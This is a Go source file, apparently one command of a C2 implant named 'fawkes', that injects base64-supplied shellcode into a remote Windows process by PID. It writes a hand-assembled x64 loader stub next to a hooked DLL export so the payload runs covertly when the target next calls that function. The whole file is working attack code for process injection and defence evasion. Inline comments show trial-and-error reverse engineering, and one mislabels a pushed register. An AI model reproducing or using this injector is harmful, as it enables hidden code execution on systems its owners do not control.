//go:build windows
// +build windows

package commands

import (
	"encoding/base64"
	"encoding/binary"
	"encoding/json"
	"fmt"
	"syscall"
	"unsafe"

	"fawkes/pkg/structs"

	"golang.org/x/sys/windows"
)

type ThreadlessInjectCommand struct{}

func (c *ThreadlessInjectCommand) Name() string {
	return "threadless-inject"
}

func (c *ThreadlessInjectCommand) Description() string {
	return "Inject shellcode using threadless injection by hooking a DLL function in a remote process"
}

func (c *ThreadlessInjectCommand) Execute(task structs.Task) structs.CommandResult {
	// Parse parameters
	var params struct {
		ShellcodeB64 string `json:"shellcode_b64"`
		PID          int    `json:"pid"`
		DLLName      string `json:"dll_name"`
		FunctionName string `json:"function_name"`
	}

	if err := json.Unmarshal([]byte(task.Params), &params); err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Failed to parse parameters: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	// Validate parameters
	if params.ShellcodeB64 == "" {
		return structs.CommandResult{
			Output:    "Shellcode is required",
			Status:    "error",
			Completed: true,
		}
	}

	if params.PID == 0 {
		return structs.CommandResult{
			Output:    "PID is required",
			Status:    "error",
			Completed: true,
		}
	}

	// Decode shellcode
	shellcode, err := base64.StdEncoding.DecodeString(params.ShellcodeB64)
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Failed to decode shellcode: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	if len(shellcode) == 0 {
		return structs.CommandResult{
			Output:    "Shellcode is empty",
			Status:    "error",
			Completed: true,
		}
	}

	// Perform threadless injection
	output, err := threadlessInject(uint32(params.PID), shellcode, params.DLLName, params.FunctionName)
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Threadless injection failed: %v\n%s", err, output),
			Status:    "error",
			Completed: true,
		}
	}

	return structs.CommandResult{
		Output:    output,
		Status:    "completed",
		Completed: true,
	}
}

func (c *ThreadlessInjectCommand) ExecuteWithAgent(task structs.Task, agent *structs.Agent) structs.CommandResult {
	return c.Execute(task)
}

func threadlessInject(pid uint32, shellcode []byte, dllName, functionName string) (string, error) {
	var output string

	// Load necessary libraries
	kernel32 := windows.NewLazySystemDLL("kernel32.dll")

	openProcess := kernel32.NewProc("OpenProcess")
	virtualAllocEx := kernel32.NewProc("VirtualAllocEx")
	writeProcessMemory := kernel32.NewProc("WriteProcessMemory")
	virtualProtectEx := kernel32.NewProc("VirtualProtectEx")
	readProcessMemory := kernel32.NewProc("ReadProcessMemory")
	getModuleHandleW := kernel32.NewProc("GetModuleHandleW")
	getProcAddress := kernel32.NewProc("GetProcAddress")

	output += fmt.Sprintf("[+] Starting threadless injection into PID %d\n", pid)
	output += fmt.Sprintf("[+] Target DLL: %s, Function: %s\n", dllName, functionName)
	output += fmt.Sprintf("[+] Shellcode size: %d bytes\n", len(shellcode))

	// Open target process
	hProcess, _, err := openProcess.Call(
		uintptr(windows.PROCESS_VM_OPERATION|windows.PROCESS_VM_WRITE|windows.PROCESS_VM_READ|windows.PROCESS_QUERY_INFORMATION|windows.PROCESS_CREATE_THREAD),
		0,
		uintptr(pid),
	)
	if hProcess == 0 {
		return output, fmt.Errorf("failed to open process: %v", err)
	}
	defer windows.CloseHandle(windows.Handle(hProcess))
	output += fmt.Sprintf("[+] Opened process handle: 0x%x\n", hProcess)

	// Get the function address in our local process to determine target
	dllNamePtr, _ := syscall.UTF16PtrFromString(dllName)
	localDllHandle, _, _ := getModuleHandleW.Call(uintptr(unsafe.Pointer(dllNamePtr)))
	if localDllHandle == 0 {
		return output, fmt.Errorf("failed to load local DLL")
	}

	funcNamePtr, _ := syscall.BytePtrFromString(functionName)
	localFuncAddr, _, _ := getProcAddress.Call(localDllHandle, uintptr(unsafe.Pointer(funcNamePtr)))
	if localFuncAddr == 0 {
		return output, fmt.Errorf("failed to find function in local DLL")
	}

	// The export address in the remote process (assumes same base address)
	exportAddress := localFuncAddr
	output += fmt.Sprintf("[+] Target function address: 0x%x\n", exportAddress)

	// Read original bytes from the target function
	originalBytes := make([]byte, 8)
	var bytesRead uintptr
	ret, _, _ := readProcessMemory.Call(
		hProcess,
		exportAddress,
		uintptr(unsafe.Pointer(&originalBytes[0])),
		8,
		uintptr(unsafe.Pointer(&bytesRead)),
	)
	if ret == 0 {
		return output, fmt.Errorf("failed to read original function bytes")
	}
	output += fmt.Sprintf("[+] Read original bytes: %x\n", originalBytes)

	// Create the loader stub matching the reference implementation
	// Reference loader from dreamkinn/go-ThreadlessInject:
	// 1. pop rax - Get return address from CALL
	// 2. sub rax, 5 - Calculate hooked function start
	// 3. push regs - Save state
	// 4. mov rcx, <addr> - Function address
	// 5. mov [rcx], <bytes> - Restore original 8 bytes (placeholder at 0x12)
	// 6. sub rsp, 0x40 - Shadow space
	// 7. call shellcode - Relative call
	// 8. add rsp, 0x40 - Cleanup
	// 9. pop regs - Restore state
	// 10. jmp rax - Jump to restored function
	loaderStub := []byte{
		// pop rax
		0x58,
		// sub rax, 5
		0x48, 0x83, 0xE8, 0x05,
		// push rax, rcx, rdx, r8, r9, r10, r11, r13
		0x50, 0x51, 0x52, 0x41, 0x50, 0x41, 0x51, 0x41, 0x52, 0x41, 0x53,
		// mov rcx, <exportAddress> (8 byte immediate)
		0x48, 0xB9, 0x88, 0x77, 0x66, 0x55, 0x44, 0x33, 0x22, 0x11, // Placeholder at offset 0x12-0x19
		// mov [rcx], <original8bytes> - This needs to be: mov qword ptr [rcx], imm64
		// But x64 doesn't have mov [mem], imm64 directly. Reference uses different approach.
		// Looking at reference bytes: 0x48, 0x89, 0x08 = mov [rax], rcx
		// They must load the bytes into a register first
		// Let me match their exact bytes: 0x48, 0x89, 0x08 at this position
		// Wait, reference shows: 0x48, 0xB9 (mov rcx), then 0x88,0x77... (placeholder), then 0x48, 0x89, 0x08
		// So: mov rcx, <placeholder>; mov [rax], rcx
		// But that writes rcx to [rax]. We need the original bytes in a placeholder.
		// Let me look at reference more carefully: offset 0x12 has 0x88,0x77,0x66,0x55,0x44,0x33,0x22,0x11
		// Those are the placeholder bytes that get replaced with original function bytes
		// Then 0x48, 0x89, 0x08 = mov [rax], rcx
		// So RCX contains the original bytes! The mov rcx instruction loads them.
		// That means: mov rcx, <8 bytes of original function>; mov [rax], rcx
		// RAX has the function address from pop+sub
		0x48, 0x89, 0x08, // mov [rax], rcx - Write RCX (original bytes) to RAX (function addr)
		// sub rsp, 0x40
		0x48, 0x83, 0xEC, 0x40,
		// call <offset> - relative call to shellcode
		0xE8, 0x11, 0x00, 0x00, 0x00, // Offset 0x11 (17 bytes) to skip cleanup code
		// add rsp, 0x40
		0x48, 0x83, 0xC4, 0x40,
		// pop r13, r11, r10, r9, r8, rdx, rcx, rax
		0x41, 0x5B, 0x41, 0x5A, 0x41, 0x59, 0x41, 0x58, 0x5A, 0x59, 0x58,
		// jmp rax - Jump to restored function
		0xFF, 0xE0,
		0x90, // nop
	}

	// Patch in the original bytes at offset 0x12 (replaces 0x88,0x77,0x66,0x55,0x44,0x33,0x22,0x11)
	binary.LittleEndian.PutUint64(loaderStub[0x12:0x1A], binary.LittleEndian.Uint64(originalBytes))

	// Combine loader + shellcode
	payload := append(loaderStub, shellcode...)
	payloadSize := len(payload)
	output += fmt.Sprintf("[+] Payload size (loader + shellcode): %d bytes\n", payloadSize)

	// Find a memory hole within +/-2GB of the target function (required for relative call)
	loaderAddress, err := findMemoryHole(hProcess, exportAddress, uintptr(payloadSize), virtualAllocEx)
	if err != nil {
		return output, fmt.Errorf("failed to find memory hole: %v", err)
	}
	output += fmt.Sprintf("[+] Allocated memory at: 0x%x\n", loaderAddress)

	// Write the payload to the allocated memory
	ret, _, err = writeProcessMemory.Call(
		hProcess,
		loaderAddress,
		uintptr(unsafe.Pointer(&payload[0])),
		uintptr(payloadSize),
		uintptr(unsafe.Pointer(&bytesRead)),
	)
	if ret == 0 {
		return output, fmt.Errorf("failed to write payload: %v", err)
	}
	output += fmt.Sprintf("[+] Wrote %d bytes to remote process\n", bytesRead)

	// Change memory protection on payload to RX
	var oldProtect uint32
	ret, _, _ = virtualProtectEx.Call(
		hProcess,
		loaderAddress,
		uintptr(payloadSize),
		windows.PAGE_EXECUTE_READ,
		uintptr(unsafe.Pointer(&oldProtect)),
	)
	if ret == 0 {
		return output, fmt.Errorf("failed to protect payload memory")
	}
	output += "[+] Changed payload memory to PAGE_EXECUTE_READ\n"

	// Calculate relative address for the call instruction
	relativeAddress := int64(loaderAddress) - int64(exportAddress) - 5
	if relativeAddress > 0x7FFFFFFF || relativeAddress < -0x80000000 {
		return output, fmt.Errorf("loader too far from target function for relative call")
	}

	// Create the hook: E8 <relative_address> (5 byte relative call)
	hook := []byte{0xE8, 0x00, 0x00, 0x00, 0x00}
	binary.LittleEndian.PutUint32(hook[1:5], uint32(relativeAddress))
	output += fmt.Sprintf("[+] Hook bytes: %x\n", hook)

	// Change protection on target function to RWX
	ret, _, _ = virtualProtectEx.Call(
		hProcess,
		exportAddress,
		8,
		windows.PAGE_EXECUTE_READWRITE,
		uintptr(unsafe.Pointer(&oldProtect)),
	)
	if ret == 0 {
		return output, fmt.Errorf("failed to change function memory protection")
	}
	output += "[+] Changed function memory protection to RWX\n"

	// Write the hook
	ret, _, err = writeProcessMemory.Call(
		hProcess,
		exportAddress,
		uintptr(unsafe.Pointer(&hook[0])),
		uintptr(len(hook)),
		uintptr(unsafe.Pointer(&bytesRead)),
	)
	if ret == 0 {
		return output, fmt.Errorf("failed to write hook: %v", err)
	}
	output += fmt.Sprintf("[+] Wrote %d byte hook to function\n", bytesRead)

	// Restore protection on target function to RX
	ret, _, _ = virtualProtectEx.Call(
		hProcess,
		exportAddress,
		8,
		windows.PAGE_EXECUTE_READ,
		uintptr(unsafe.Pointer(&oldProtect)),
	)

	output += "[+] Threadless injection complete!\n"
	output += "[+] Shellcode will execute when the target process calls the hooked function\n"
	output += "[+] After execution, the function will be automatically restored\n"

	return output, nil
}

// findMemoryHole finds a memory location within +/-2GB of the target address
func findMemoryHole(hProcess uintptr, targetAddr uintptr, size uintptr, virtualAllocEx *windows.LazyProc) (uintptr, error) {
	// Start searching from 2GB below target, up to 2GB above
	startAddr := (targetAddr & 0xFFFFFFFFFFF70000) - 0x70000000
	endAddr := targetAddr + 0x70000000

	for addr := startAddr; addr < endAddr; addr += 0x10000 {
		result, _, _ := virtualAllocEx.Call(
			hProcess,
			addr,
			size,
			uintptr(windows.MEM_COMMIT|windows.MEM_RESERVE),
			uintptr(windows.PAGE_READWRITE),
		)
		if result != 0 {
			return result, nil
		}
	}

	return 0, fmt.Errorf("could not find suitable memory hole within +/-2GB")
}
